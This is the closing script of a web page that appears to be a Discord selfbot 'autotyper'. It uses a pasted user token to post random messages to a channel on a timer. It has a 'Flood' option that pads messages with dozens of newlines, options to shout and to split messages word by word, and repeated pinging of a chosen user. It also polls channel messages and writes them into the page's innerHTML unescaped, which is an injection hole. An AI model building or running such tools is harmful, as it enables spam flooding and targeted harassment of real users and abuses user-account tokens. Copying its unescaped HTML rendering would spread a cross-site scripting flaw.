        for (let i = 0; i < autotyperMessages.length && autotyperRunning; i++) {
            let message = autotyperMessages[Math.floor(Math.random() * autotyperMessages.length)];

            document.querySelectorAll('.option-button.active').forEach(button => {
                const text = button.textContent;

                if (text.includes('(Flood)')) {
                    message = `A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${message}`;
                }
                if (text.includes('(Capitalize)')) {
                    message = message.toUpperCase();
                }
                if (text.includes('(Bolder)')) {
                    message = `# ${message}`;
                }
                if (text.includes('(1msg mode)')) {
                    message = message.split(' ').join('\n');
                }
                if (text.includes('(Adder)')) {
                    const adderSentences = getAdderSentences();
                    if (adderSentences.length > 0) {
                        const randomSentence = adderSentences[Math.floor(Math.random() * adderSentences.length)];
                        message = `${message} ${randomSentence}`;
                    }
                }
            });
            await sendAutotyperMessage(channelId, token, message);
            await new Promise(resolve => setTimeout(resolve, autotyperDelay * 1000));
        }

        autotyperRunning = false;
        document.getElementById("autotyperButton").textContent = "Autotyper";
    }

    async function sendAutotyperMessage(channelId, token, messageContent) {
        if (!channelId || !token || !messageContent) {
            return;
        }

        const userId = document.getElementById("userIdInput").value;
        if (userId) {
            messageContent = ` ${messageContent} <@${userId}>`;
        }

        try {
            const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
                method: "POST",
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    content: messageContent,
                }),
            });

            if (response.ok) {
                console.log("message sent");
            } else {
                const errorData = await response.json();
                console.error("error sending message:", errorData);
            }
        } catch (error) {
            console.error("error sending message:", error);
        }
    }

    document.getElementById('message').addEventListener('input', function() {
        const message = this.value.trim();
        const validMessages = ['2', '22', '222', '2222', '22222'];

        if (validMessages.includes(message)) {
            const token = document.getElementById("token").value;
            const channelId = document.getElementById('channelId').value;

            if (autotyperMessages.length > 0) {
                const randomLine = autotyperMessages[Math.floor(Math.random() * autotyperMessages.length)];
                sendAutotyperMessage(channelId, token, randomLine);
            } else {
                console.error("Autotyper messages are not loaded.");
            }

            this.value = '';
        }
    });

    function updateAutotyperDelay(value) {
        autotyperDelay = parseFloat(value);
        document.getElementById("currentAutotyperDelay").textContent = value;
    }

    document.getElementById("autotyperDelay").addEventListener("input", (event) => {
        updateAutotyperDelay(event.target.value);
    });

    function fetchMessages() {
        const token = document.getElementById("token").value;
        const channelId = document.getElementById('channelId').value;

        if (token && channelId) {
            fetch(`https://discord.com/api/v9/channels/${channelId}/messages?limit=50`, {
                headers: {
                    'Authorization': token
                }
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                const chatContainer = document.getElementById('chatContainer');
                chatContainer.innerHTML = '';
                if (data.length === 0) {
                    const msgElement = document.createElement('div');
                    msgElement.textContent = 'No messages found.';
                    chatContainer.appendChild(msgElement);
                } else {
                    data.reverse().forEach(message => {
                        const msgElement = document.createElement('div');
                        msgElement.classList.add('message');
                        const avatarImg = document.createElement('img');
                        avatarImg.src = message.author.avatar ?
                            `https://cdn.discordapp.com/avatars/${message.author.id}/${message.author.avatar}.png` :
                            'default-avatar.png';
                        avatarImg.alt = `${message.author.username}'s avatar`;
                        avatarImg.classList.add('avatar');
                        const senderName = message.author.username;
                        msgElement.innerHTML = `<span class="sender">${senderName}:</span> ${message.content}`;
                        msgElement.prepend(avatarImg);
                        chatContainer.appendChild(msgElement);
                    });
                }
                chatContainer.scrollTop = chatContainer.scrollHeight;
            })
            .catch(error => console.error('error fetching:', error));
        } else {
            console.error('token or CID missing');
        }
    }

    setInterval(fetchMessages, 500);

    function playButtonSound() {
        const sound = document.getElementById('buttonSound');
        if (sound) {
            sound.currentTime = 0;
            sound.play();
        } else {
            console.error('Sound file not found.');
        }
    }

    document.querySelectorAll('button').forEach(button => {
        button.addEventListener('click', () => {
            playButtonSound();
        });
    });

    document.querySelectorAll('.option-button').forEach(button => {
        button.addEventListener('click', () => {
            playButtonSound();
        });
    });
</script>

</html>